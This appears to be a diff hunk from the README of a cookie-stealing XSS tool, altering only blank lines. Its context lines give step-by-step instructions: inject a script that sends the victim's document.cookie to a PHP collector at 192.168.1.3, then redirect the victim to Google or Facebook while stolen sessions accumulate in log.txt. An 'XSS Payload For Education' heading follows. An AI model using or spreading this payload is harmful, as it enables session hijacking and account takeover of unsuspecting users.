@@ -21,8 +21,8 @@
 3. How to inject A **Javascript** Payload in inpute? For an Example `<script>window.location = "http://192.168.1.3/cookie/cookiesteal.php?c=" + document.cookie;</script>`
 4. after injected the xss payload it will take the user to `google.com` page you can change it whatever you want the original is`header("Location: http://www.google.com/");` i can change it to facebook like this `header("Location: http://www.facebook.com/");`
 5. After User or "Victim" click or submit the link the cookie session will get it in `log.txt` file...
-
-
+</br>
+</br>
 ### XSS Payload For Education:->?>
 
 ```
